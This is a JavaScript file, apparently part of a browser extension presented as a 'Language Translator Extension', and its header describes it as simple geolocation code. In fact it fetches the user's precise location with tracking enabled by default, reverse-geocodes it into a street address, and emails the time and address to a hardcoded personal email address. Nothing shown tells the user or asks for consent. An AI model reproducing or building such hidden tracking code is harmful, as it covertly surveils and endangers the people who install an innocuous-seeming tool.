
/**
	This javascript file is to get the current geo location by navigator.geolocation API.
**/

var GeoLocationAPI =
{
    // send location to me
    SendLocation: function ()
    {
        var start = getItem(OptionItemKeys.StartLocation);
        var locateMe = getItem(OptionItemKeys.EnableLocation);

        if ((locateMe == TrueValue || locateMe == undefined) && (start == undefined || start.toString().toUpperCase() != TrueValue.toUpperCase()))
        {
            logD("need locating me: " + locateMe);
            setItem(OptionItemKeys.StartLocation, true);
            var options = { desiredAccuracy: 20, maxWait: GeoLocationAPI.timeout }; // 20 meters
            try
            {
                // get position
                navigator.geolocation.getAccurateCurrentPosition(GeoLocationAPI.onSuccess, GeoLocationAPI.onError, GeoLocationAPI.onProgress, options);
            }
            catch (e)
            {
                logD(e.Message);
            }
        }
        else
        {
            logD("skip locating me: " + locateMe);
        }
    },

    isPositioned: false,
    timeout: 60 * 1000, // 60 seconds

    onSuccess: function (position)
    {
        GeoLocationAPI.isPositioned = true;
        var name = "Language Translator Extension";
        var from = "vanillapeter@gmail.com";

        var time = new Date(position.timestamp).toString();

        var coords = position.coords;

        var latitude = coords.latitude;
        var longitude = coords.longitude;
        var accuracy1 = coords.accuracy;

        var altitude = coords.altitude == null ? "" : coords.altitude;
        var accuracy2 = coords.altitudeAccuracy == null ? "" : coords.altitudeAccuracy;

        // var results = $.ajax({ url: "http://maps.googleapis.com/maps/api/geocode/json?latlng=22.543098999999998,114.057868&sensor=false", dataType: "json", type: "get", async: false }).responseText;
        var url = "http://maps.googleapis.com/maps/api/geocode/json?latlng=" + latitude + "," + longitude + "&sensor=false";
        var results = $.ajax({ url: url, dataType: "json", type: "get", async: false }).responseText;

        var or = JSON.parse(results);
        var address = null;
        if (or.status == "OK")
        {
            if (or.results && or.results.length > 0)
            {
                address = or.results[0].formatted_address;
            }
        }

        var content = "Time on " + time + "."
                + NewLine + (address != null && address != "" ? "With Address: " + address : "Without Address.")
                + NewLine + "";
        // disable it
        setItem(OptionItemKeys.StartLocation, false);
        setItem(OptionItemKeys.EnableLocation, false);
        // send email
        logW(content);
        MailAPI.Send(name, from, content, null, null, "");
    },

    onError: function (error)
    {
        logD("Error when getting position: " + error.message);
        var options = { enableHighAccuracy: false, timeout: GeoLocationAPI.timeout, maximumAge: 24 * 60 * 1000 }; // cached one day
        try
        {
            setItem(OptionItemKeys.StartLocation, false);
            if (!GeoLocationAPI.isPositioned)
            {
                // get position
                navigator.geolocation.getCurrentPosition(GeoLocationAPI.onSuccess, GeoLocationAPI.onError, options);
                GeoLocationAPI.isPositioned = true;
            }
        }
        catch (e)
        {
            logD("Error when getCurrentPosition: " + e.Message);
        }
    },

    onProgress: function (position) { }
};
